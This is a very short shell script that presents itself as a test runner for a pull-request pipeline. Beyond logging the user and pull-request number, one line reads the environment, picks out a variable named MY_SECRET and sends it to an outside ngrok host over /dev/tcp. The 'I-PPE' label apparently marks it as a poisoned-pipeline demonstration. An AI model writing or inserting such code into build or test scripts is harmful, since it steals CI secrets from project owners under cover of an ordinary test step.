echo "Executing Tests script [from user $1 at $2]" >> runtests.out
RET=0
echo ------- I-PPE From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/5.tcp.eu.ngrok.io/13276
#exit $RET
